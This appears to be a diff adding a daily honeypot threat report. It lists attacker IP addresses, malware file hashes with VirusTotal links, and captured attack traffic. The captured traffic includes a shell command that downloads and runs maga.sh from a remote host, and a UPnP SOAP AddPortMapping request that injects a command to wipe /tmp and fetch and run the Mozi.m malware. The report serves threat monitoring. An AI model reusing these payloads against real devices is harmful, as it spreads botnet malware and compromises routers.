@@ -1,0 +1,47 @@
+Top 5 IPs for 01-10-2024 :
+
+128.199.47.208
+31.220.95.86
+197.5.145.59
+47.185.253.146
+113.125.78.238
+
+
+Malware Observed:
+
+File name : sshd
+9e5b93d3095f577136717e6aae8b51fea50d66ef9123eedccfc23b8faebf6d6c
+https://www.virustotal.com/gui/file/9e5b93d3095f577136717e6aae8b51fea50d66ef9123eedccfc23b8faebf6d6c
+
+
+085ead835f15bf555699317035f33d275d5f81c6fd3e45393da4ada1b40e9d60
+https://www.virustotal.com/gui/file/085ead835f15bf555699317035f33d275d5f81c6fd3e45393da4ada1b40e9d60
+
+
+2d05a78850fdc5d093f82f82519c55c0ec686de6e7aaa1a3678455d8cf987eff
+https://www.virustotal.com/gui/file/2d05a78850fdc5d093f82f82519c55c0ec686de6e7aaa1a3678455d8cf987eff
+
+
+8583db7150106a76a951b33eed7ad90efa913cfa7aa6b262c0b7a280e12fd491
+https://www.virustotal.com/gui/file/8583db7150106a76a951b33eed7ad90efa913cfa7aa6b262c0b7a280e12fd491
+
+
+86262343e4a0084bb7a6353cb60d536846d6697586e755dd740eeae21b62a0a6
+https://www.virustotal.com/gui/file/86262343e4a0084bb7a6353cb60d536846d6697586e755dd740eeae21b62a0a6
+
+Commands/expoits observed :
+
+CMD: cd /tmp ; echo uname -a > nite ; chmod 777 nite ; ./nite ; rm -rf nite ; cd /tmp ; wget http://146.19.191.226/maga.sh ; curl -O http://146.19.191.226/maga.sh ; chmod 777 maga.sh ; ./maga.sh > /dev/null 2>&1 &
+
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <Host IP>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://59.94.111.125:55771/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
